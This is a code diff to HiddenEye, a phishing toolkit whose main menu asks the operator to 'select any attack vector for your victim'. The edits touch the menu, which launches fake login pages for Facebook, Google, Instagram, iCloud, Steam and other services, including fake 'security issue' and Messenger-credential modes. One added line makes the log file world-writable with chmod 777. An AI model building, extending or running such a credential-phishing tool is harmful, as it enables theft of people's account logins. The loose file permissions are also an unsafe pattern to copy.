@@ -11,7 +11,7 @@ from sys import stdout, argv, exit
 from Defs.Configurations import readConfig, ifSettingsNotExists
 from Defs.Languages import *
 
-RED, WHITE, CYAN, GREEN, DEFAULT = '\033[91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m'
+RED, WHITE, CYAN, GREEN, DEFAULT  = '\033[91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m'
 
 installGetText()
 languageSelector()
@@ -24,6 +24,7 @@ for arg in argv:
     if arg=="--nolog": #If true - don't log
         didBackground = False
 if config.get("Settings", "DidBackground") == "True":
+    system('touch log.txt && chmod 777 log.txt') 
     logFile = open("log.txt", "w")
 
 def runPhishing(page , customOption): #Phishing pages selection menu
@@ -172,40 +173,56 @@ def runMainMenu(): #menu where user select what they wanna use
         system('clear')
         print (_('\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE. GOOD BYE!{1} ]\n\n').format(RED, DEFAULT))
         exit(0)
-    option = input(_("\nSELECT ANY ATTACK VECTOR FOR YOUR VICTIM:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIn\n\n {0}[{1}4{0}]{1} GitHub\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Twitter\n\n {0}[{1}8{0}]{1} Instagram\n\n {0}[{1}9{0}]{1} Snapchat\n\n {0}[{1}10{0}]{1} Yahoo\n\n {0}[{1}11{0}]{1} Twitch\n\n {0}[{1}12{0}]{1} Microsoft\n\n {0}[{1}13{0}]{1} Steam\n\n {0}[{1}14{0}]{1} VK\n\n {0}[{1}15{0}]{1} iCloud\n\n{0}HiddenEye >>>  {1}").format(RED, DEFAULT))
-    if option == '1':
+        system('clear')
+    print (_('''
+           {3}______________________________________________ 
+               ______________________________________
+               
+                    {1}_....~~~~=====~~~~...._
+                 .'========={3}/{2}_____{3}==\{1}=========>
+                /:========={3}/{2}_____{3}====\{1}
+               |=========={3}|{2}_____{3}======|{1}==========>
+                \:========={3}\{2}___{3}======/{1}
+                  \=========={3}\=====/{1}==========>
+                     ````~~~~=======~~~~````
+
+                  {3}HIDDEN EYE {3}BY: DARKSEC TEAM
+              {3} ______________________________________   
+           _______________________________________________''').format(CYAN, DEFAULT, CYAN, RED))    
+    option = input(_("\nSELECT ANY ATTACK VECTOR FOR YOUR VICTIM:\n {0}[{1}01{0}]{1} Facebook\n {0}[{1}02{0}]{1} Google\n {0}[{1}03{0}]{1} LinkedIn\n {0}[{1}04{0}]{1} GitHub\n {0}[{1}05{0}]{1} StackOverflow\n {0}[{1}06{0}]{1} WordPress\n {0}[{1}07{0}]{1} Twitter\n {0}[{1}08{0}]{1} Instagram\n {0}[{1}09{0}]{1} Snapchat\n {0}[{1}10{0}]{1} Yahoo\n {0}[{1}11{0}]{1} Twitch\n {0}[{1}12{0}]{1} Microsoft\n {0}[{1}13{0}]{1} Steam\n {0}[{1}14{0}]{1} VK\n {0}[{1}15{0}]{1} iCloud\n\n{0}HiddenEye >>>  {1}").format(RED, CYAN))
+    if option == '1' or option == '01':
         loadModule('Facebook')
-        customOption = input(_("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n{0}HiddenEye >>> {1}").format(RED, DEFAULT))
+        customOption = input(_("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n{0}HiddenEye >>> {1}").format(RED, CYAN))
         runPhishing('Facebook', customOption)
-    elif option == '2':
+    elif option == '2' or option == '02':
         loadModule('Google')
-        customOption = input(_("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}3{0}]{1} New Google Web\n\n{0}HiddenEye >>> {1}").format(RED, DEFAULT))
+        customOption = input(_("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}3{0}]{1} New Google Web\n\n{0}HiddenEye >>> {1}").format(RED, CYAN))
         runPhishing('Google', customOption)
-    elif option == '3':
+    elif option == '3' or option == '03':
         loadModule('LinkedIn')
         customOption = ''
         runPhishing('LinkedIn', customOption)
-    elif option == '4':
+    elif option == '4' or option == '04':
         loadModule('GitHub')
         customOption = ''
         runPhishing('GitHub', customOption)
-    elif option == '5':
+    elif option == '5' or option == '05':
         loadModule('StackOverflow')
         customOption = ''
         runPhishing('StackOverflow', customOption)
-    elif option == '6':
+    elif option == '6' or option == '06':
         loadModule('WordPress')
         customOption = ''
         runPhishing('WordPress', customOption)
-    elif option == '7':
+    elif option == '7' or option == '07':
         loadModule('Twitter')
         customOption = ''
         runPhishing('Twitter', customOption)
-    elif option == '8':
+    elif option == '8' or option == '08':
         loadModule('Instagram')
-        customOption = input(_("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (After submit redirects to original autoliker)\n\n {0}[{1}3{0}]{1} Instagram Advanced Scenario (Appears as Instagram Profile)\n\n{0}HiddenEye >>> {1}").format(RED, DEFAULT))
+        customOption = input(_("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (After submit redirects to original autoliker)\n\n {0}[{1}3{0}]{1} Instagram Advanced Scenario (Appears as Instagram Profile)\n\n{0}HiddenEye >>> {1}").format(RED, CYAN))
         runPhishing('Instagram', customOption)
-    elif option == '9':
+    elif option == '9' or option == '09':
         loadModule('Snapchat')
         customOption = ''
         runPhishing('Snapchat', customOption)
@@ -227,7 +244,7 @@ def runMainMenu(): #menu where user select what they wanna use
         runPhishing('Steam', customOption)
     elif option == '14':
         loadModule('VK')
-        customOption = input(_("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n{0}HiddenEye >>> {1}").format(RED, DEFAULT))
+        customOption = input(_("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n{0}HiddenEye >>> {1}").format(RED, CYAN))
         runPhishing('VK', customOption)
     elif option == '15':
         loadModule('iCloud')
@@ -276,14 +293,13 @@ def runServer():
 def endMessage(): #Message when HiddenEye exit
     system('clear')
     print (_('''
-                     {1}_....~~~~=====~~~~...._
-                  .'========={3}/----=\{1}=========>
-                /:========={3}/-----====\{1}
-               |=========={3}|-----======|{1}==========>
-                \:========={3}\---======/{1}
+                      {1}_....~~~~=====~~~~...._
+                 .'========={3}/{2}_____{3}==\{1}=========>
+                /:========={3}/{2}_____{3}====\{1}
+               |=========={3}|{2}_____{3}======|{1}==========>
+                \:========={3}\{2}___{3}======/{1}
                   \=========={3}\=====/{1}==========>
                      ````~~~~=======~~~~````
-
                   {3}HIDDEN EYE {3}BY: DARKSEC TEAM
          {0}THANKS FOR USING IT. HELP US TO MAKE IT MORE USEFUL
               {3}https://github.com/DarkSecDevelopers/HiddenEye     ''').format(GREEN, DEFAULT, CYAN, RED))
